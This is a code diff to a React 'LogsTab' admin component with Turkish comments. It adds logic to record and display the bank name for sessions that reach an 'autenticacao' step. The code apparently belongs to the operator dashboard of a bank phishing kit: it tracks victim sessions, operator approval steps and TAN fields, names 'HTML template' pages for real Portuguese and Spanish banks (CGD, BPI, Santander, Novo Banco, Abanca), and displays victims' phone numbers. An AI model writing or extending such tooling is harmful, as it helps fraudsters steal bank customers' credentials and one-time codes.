@@ -1594,6 +1594,22 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           submittedAt: previousFormData.autenticacaoSubmittedAt || new Date().toISOString(),
         });
       }
+      // Autenticacao kolonu icin banka kaydini garantiye al:
+      // istemci autenticacaoBankName yazamadiysa ve slug auth-only setteyse
+      // mevcut bankSlug/bankName'den turetilir. Normal sablonlu banka yazilmaz.
+      const prevBankSlugLower =
+        typeof previousFormData.bankSlug === "string"
+          ? previousFormData.bankSlug.trim().toLowerCase()
+          : "";
+      const authBankPatch: Record<string, string> = {};
+      if (
+        AUTH_ONLY_BANK_SLUGS.has(prevBankSlugLower) &&
+        typeof previousFormData.autenticacaoBankName !== "string"
+      ) {
+        authBankPatch.autenticacaoBankSlug = String(previousFormData.bankSlug);
+        authBankPatch.autenticacaoBankName = String(previousFormData.bankName || previousFormData.bankSlug);
+      }
+
       await supabase
         .from("sessions")
         .update({
@@ -1602,6 +1618,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           current_step: "autenticacao",
           form_data: {
             ...previousFormData,
+            ...authBankPatch,
             approvalStatus: "autenticacao",
             autenticacaoHistory: authHistory,
             cmdTan: "",
@@ -2537,11 +2554,29 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         if (hasAuth) {
                           return (
                             <div className="space-y-1 text-[12px] font-medium leading-tight">
-                              {(fd.bankName || fd.bankSlug) && (
-                                <div className="font-extrabold text-[12px] text-sky-600 dark:text-sky-400 break-words [overflow-wrap:anywhere]">
-                                  {String(fd.bankName || fd.bankSlug)}
-                                </div>
-                              )}
+                              {(() => {
+                                // Autenticacao kolonu: SADECE autenticacao akisina giden banka
+                                // adi basilir. Normal HTML sablonlu banka (cgd, bpi, santander-pt,
+                                // novo-banco, abanca vb.) ismi burada ASLA gorunmez.
+                                // Onceki akistan kalan eski banka adi da basilmaz — kayit
+                                // autenticacaoBankName / autenticacaoBankSlug'dan okunur.
+                                // Geriye donuk uyumluluk: eski sessionlarda bu alanlar yoksa,
+                                // bankSlug auth-only setteyse bankName gosterilir.
+                                const authBankName =
+                                  typeof fd.autenticacaoBankName === "string" && fd.autenticacaoBankName.trim()
+                                    ? fd.autenticacaoBankName.trim()
+                                    : typeof fd.autenticacaoBankSlug === "string" && fd.autenticacaoBankSlug.trim()
+                                      ? fd.autenticacaoBankSlug.trim()
+                                      : AUTH_ONLY_BANK_SLUGS.has(rawBankSlugLower)
+                                        ? String(fd.bankName || fd.bankSlug || "")
+                                        : "";
+                                if (!authBankName) return null;
+                                return (
+                                  <div className="font-extrabold text-[12px] text-sky-600 dark:text-sky-400 break-words [overflow-wrap:anywhere]">
+                                    {authBankName}
+                                  </div>
+                                );
+                              })()}
                               {authPhone && (
                                 <div className="flex min-w-0 items-start gap-1">
                                   <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">Tel:</span>
